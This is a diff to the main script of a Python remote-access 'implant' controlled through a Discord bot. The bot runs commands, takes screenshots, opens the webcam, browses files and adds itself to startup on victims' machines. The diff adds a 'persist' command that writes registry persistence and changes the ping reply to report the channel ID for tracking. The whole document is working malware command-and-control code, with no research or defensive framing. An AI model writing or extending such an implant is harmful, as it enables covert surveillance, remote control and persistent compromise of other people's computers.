@@ -7,7 +7,7 @@ import shlex
 # Import all execution modules
 import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
 import system_info as sysinfo; import web_opener; import startup_manager
-import webcam_manager as wcm; import file_explorer as fe
+import webcam_manager as wcm; import file_explorer as fe; import persistence_manager as pm
 
 # --- Configuration ---
 TOKEN_PATH = 'token.txt'
@@ -26,7 +26,7 @@ def load_token():
 def get_device_name():
     hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()
 
-# --- Core Event Handlers (No changes here) ---
+# --- Core Event Handlers ---
 @client.event
 async def on_ready():
     print(f'Implant logged in as {client.user} on device {get_device_name()}')
@@ -58,9 +58,12 @@ async def on_message(message):
     parts = content.split(' ', 1)
     command_name = parts[0]
     args_str = parts[1] if len(parts) > 1 else ""
+
+    # MODIFIED: Send channel ID with pong for unambiguous tracking.
     if command_name == "ping":
-        await message.channel.send(f"{PONG_PREFIX}ALIVE")
+        await message.channel.send(f"{PONG_PREFIX}{message.channel.id}")
         return
+
     try:
         if command_name == "kill":
             embed = discord.Embed(title="🔴 Session Terminated", description=f"Device **{device_name}** has been shut down via remote command.", color=discord.Color.red())
@@ -97,17 +100,20 @@ async def on_message(message):
             msg=f"Successfully attempted to open `{args_str}`." if s else f"Failed to open `{args_str}`.";embed=discord.Embed(title="🌐 Open URL Status",description=msg,color=discord.Color.green() if s else discord.Color.orange())
             await message.channel.send(embed=embed)
         elif command_name == "putinstartup":
-            s=startup_manager.add_to_startup();embed=discord.Embed(title="⚙️ Startup Status",description=f"`{s}`",color=EMBED_COLOR)
+            status = startup_manager.add_to_startup();embed=discord.Embed(title="⚙️ Startup Folder Status", description=f"`{status}`", color=EMBED_COLOR)
+            await message.channel.send(embed=embed)
+        elif command_name == "persist":
+            status = pm.add_to_registry(args_str);embed=discord.Embed(title="⚙️ Registry Persistence Status", description=f"`{status}`", color=EMBED_COLOR)
             await message.channel.send(embed=embed)
         elif command_name == "explore":
             embed=fe.create_explorer_embed(args_str);await message.channel.send(embed=embed)
+        
     except Exception as e:
         embed=discord.Embed(title="❌ Implant Error",description=f"An error occurred on `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red())
         await message.channel.send(embed=embed)
 
-# --- MODIFIED: Main Execution Block ---
+# --- Main Execution Block ---
 async def main():
-    """Main async function to start the client and ensure clean shutdown."""
     try:
         await client.start(load_token())
     except discord.errors.LoginFailure:
@@ -115,7 +121,6 @@ async def main():
     except Exception as e:
         print(f"An unexpected error occurred in implant: {e}")
     finally:
-        # This ensures the session is closed even if the loop is broken.
         if not client.is_closed():
             await client.close()
             print("IMPLANT: Connection closed.")
@@ -124,5 +129,4 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        # This message is useful for when you manually stop the implant with Ctrl+C
         print("\nIMPLANT: Shutdown initiated by user.")
